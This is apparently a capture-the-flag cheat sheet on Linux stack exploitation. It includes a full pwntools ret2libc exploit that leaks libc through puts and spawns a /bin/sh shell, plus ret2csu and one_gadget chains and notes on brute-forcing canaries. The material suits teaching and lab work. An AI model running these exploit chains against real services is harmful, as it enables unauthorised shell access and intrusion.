# Stack Exploitation (Stack Pwn)

## Trigger conditions and pre-checks

### Reading checksec

```bash
checksec --file=./vuln
# Or the pwntools built-in
python -c "from pwn import *; print(ELF('./vuln'))"
```

| Output field | Impact | Response |
|---------|------|------|
| `NX disabled` | Stack is executable | Put shellcode in directly |
| `Canary found` | Stack overflows are detected | Leak or bypass the canary first (forked process / format string) |
| `PIE enabled` | Randomized .text base | A code address must be leaked |
| `No PIE` | Fixed .text | Gadget addresses can be hard-coded |
| `Full RELRO` | got not writable | Cannot change the got; use ret2libc / one_gadget |
| `Partial RELRO` | got writable | The got table can be changed |
| `FORTIFY` | Some libc functions replaced with `_chk` versions | `read_chk` can still overflow, `strcpy_chk` cannot |

### Locating the stack overflow length precisely

```python
# pwntools cyclic pattern
from pwn import *
context.arch = 'amd64'

# 1. Generate the cyclic pattern
payload = cyclic(200)

# 2. Feed it to the program to trigger the crash
p = process('./vuln')
p.sendline(payload)
p.wait()

# 3. Read the value at RSP from the core dump
core = p.corefile
fault = core.fault_addr  # or the 8 bytes RSP points to
offset = cyclic_find(fault & 0xffffffff)  # 32-bit mode
# For 64-bit use cyclic_find(p64(fault)[:8])
log.info(f"offset = {offset}")
```

### 32 / 64-bit calling convention quick reference

| Architecture | Argument passing | Return | Notes |
|------|---------|------|------|
| x86 (32-bit) | Stack arguments (cdecl: caller cleans the stack) | eax | Stack layout: ret_addr, arg1, arg2, ... |
| x86-64 SysV | rdi, rsi, rdx, rcx, r8, r9, stack | rax | rsp must be 16-byte aligned at call entry |
| ARM32 | r0-r3, stack | r0 | lr holds the return address, bx lr returns |
| ARM64 | x0-x7, stack | x0 | Similar to SysV, stricter alignment |

## Complete ret2libc pwntools template

```python
#!/usr/bin/env python3
from pwn import *

# === Environment configuration ===
exe = './vuln'
libc_path = './libc.so.6'
HOST, PORT = 'chal.example.com', 31337

context.binary = elf = ELF(exe)
context.log_level = 'info'
libc = ELF(libc_path)

# Automatic patchelf so the local run uses the libc given with the challenge
# patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(exe, gdbscript='''
            b *main+123
            continue
        ''')
    return process(exe)

# === Stage 1: leak libc ===
p = conn()

OFFSET = 0x48  # measured with cyclic
pop_rdi = 0x0000000000401383  # ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
ret     = 0x000000000040101a  # for stack alignment

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])     # make puts print the address of puts@got itself
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])     # return to main and reuse the stack overflow for a second round

p.sendlineafter(b'> ', payload)

# Receive the leak (note the recvuntil anchor string; do not use sleep)
p.recvuntil(b'bye\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked puts @ {hex(leak)}')

# Derive the libc base
libc.address = leak - libc.sym['puts']
log.success(f'libc base = {hex(libc.address)}')

# === Stage 2: ret2libc system("/bin/sh") ===
binsh    = next(libc.search(b'/bin/sh\x00'))
system   = libc.sym['system']

payload  = b'A' * OFFSET
payload += p64(ret)        # key: restore 16-byte alignment
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'> ', payload)

p.interactive()
```

### Stack alignment pitfall (required reading)

```text
Symptom: works locally, but on the remote system crashes with SIGSEGV right after entering system
Cause: libc system → do_system → somewhere inside movaps xmm0, [rsp]
       requires rsp to be 16-byte aligned
Failure: when your ROP chain jumps into system, the last digit of rsp is 0x8 instead of 0x0
Fix: insert a `ret` gadget into the ROP chain (consumes 8 bytes and realigns rsp)
```

## ret2csu (universal gadget)

When the binary has no third-argument gadget such as `pop rdx; ret`, use the fixed structure in `__libc_csu_init` (present in statically linked programs with glibc < 2.34).

```text
The fixed pattern at the end of __libc_csu_init:
    add  rsp, 8
    pop  rbx
    pop  rbp
    pop  r12
    pop  r13
    pop  r14
    pop  r15
    ret

And in the middle:
    mov  rdx, r15  ; r15 → rdx
    mov  rsi, r14  ; r14 → rsi
    mov  edi, r13d ; r13 → rdi (low 32 bits)
    call qword ptr [r12 + rbx*8]
```

pwntools code:

```python
csu_pop = 0x40119a  # first part (pop rbx..r15; ret)
csu_call = 0x401180  # second part (mov rdx,r15; ... ; call [r12+rbx*8])

def csu(rdi, rsi, rdx, call_target):
    p  = p64(csu_pop)
    p += p64(0)              # rbx = 0
    p += p64(1)              # rbp = 1 (so the later cmp rbx,rbp passes → rbx+1 == rbp)
    p += p64(call_target)    # r12 = [r12+rbx*8] dereferences to the target
    p += p64(rdi)            # r13
    p += p64(rsi)            # r14
    p += p64(rdx)            # r15
    p += p64(csu_call)
    p += b'\x00' * 8 * 7     # after the second part's ret, 7 more pops
    return p
```

Applies: write a function pointer into bss, then call it through csu; often used to jump to bss and run ROP after a `read(0, bss, 0x100)` stage.

## one_gadget usage

```bash
one_gadget ./libc.so.6

# Output looks like:
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
```

Usage:

```python
og = [0xe3afe, 0xe3b01, 0xe3b04]
payload  = b'A' * OFFSET
payload += p64(ret)
payload += p64(libc.address + og[1])  # pick the one whose constraints can be met
```

**Pitfall**: in some libc versions (2.34+) one_gadget constraints are very hard to meet; plain ret2libc is more reliable.

## libc-database lookup

Scenario: the challenge gives no libc, so the version must be derived from a few leaked function addresses.

```bash
cd ~/tools/libc-database

# Look it up with the leaked puts and read addresses (last 3 digits)
./find puts 0x6f0 read 0xfd
# Output: libc6_2.31-0ubuntu9.9_amd64

# Get every symbol offset of that libc
./dump libc6_2.31-0ubuntu9.9_amd64

# Download the actual libc.so.6 locally
ls db/libc6_2.31-0ubuntu9.9_amd64.so
```

pwntools integration:

```python
# Online libc-database lookup (no local copy needed)
from pwnlib.libcdb import search_by_symbol_offsets
libs = search_by_symbol_offsets({'puts': 0x6f0, 'read': 0xfd})
libc = ELF(libs[0])
```

## ROPgadget quick reference

```bash
# Basics: pop|ret with a single register
ROPgadget --binary ./vuln --only "pop|ret"

# Find syscall
ROPgadget --binary ./vuln | grep ': syscall'

# Find with specific bytes
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep 'pop rdi'

# Find strings
ROPgadget --binary ./libc.so.6 --string '/bin/sh'

# Output JSON for programmatic parsing
ROPgadget --binary ./vuln --json > gadgets.json
```

Ropper as an alternative (wider architecture support):

```bash
ropper --file ./vuln --search "pop rdi; ret"
ropper --file ./libc.so.6 --search "syscall"
```

## Remote stabilization checklist

| Problem | Symptom | Fix |
|------|------|------|
| Wrong libc version | Works locally, SIGSEGV in system remotely | After the leak, look up the actual version in libc-database |
| Stack alignment | system segfaults immediately | Add a `ret` gadget |
| Network latency | recv gets half the data | Use `recvuntil(b'anchor string')`, not `sleep` |
| Buffering | No reaction after sendline | Switch to `sendlineafter` and wait for the prompt explicitly |
| ASLR jitter | Probabilistic success | Check whether it is a byte-level brute force (a 1/16 chance is not reliable) |
| TCP nagle | Small packets merged | `p.settimeout(2); p.recvall(timeout=2)` as a fallback |

## Debugging tips

```python
# pwntools embedded gdb attach
p = process('./vuln')
gdb.attach(p, '''
    b *main+0x123
    b *0x401234
    commands
        telescope $rsp 20
        continue
    end
''')

# Run inside gdb from the start
p = gdb.debug('./vuln', '''
    set follow-fork-mode child
    b main
''')
```

Common GEF/pwndbg commands:

```text
checksec               # view protections
vmmap                  # memory layout
telescope $rsp 30      # stack chain (pwndbg)
stack 30               # similar (GEF)
got                    # GOT table
search-pattern "/bin/sh"
context                # automatically shows reg + stack + code (on by default)
ropgadget              # built-in gadget search
```

## Notes

- Direct shellcode works only with **NX off + ASLR off**; modern binaries almost always enable NX
- **The canary does not change in forked children**: a forking server can be brute-forced byte by byte (1/256 × 7 bytes)
- **A format string can leak both the canary and libc**: scan the stack with `%p %p ... %p`
- **DynELF is slow but universal**: when no libc is given at all, pwntools `DynELF` can leak the symbol table byte by byte purely through the program's own IO primitives
- **Statically linked programs have no libc.got**: use SROP (sigreturn-oriented programming) or direct syscalls
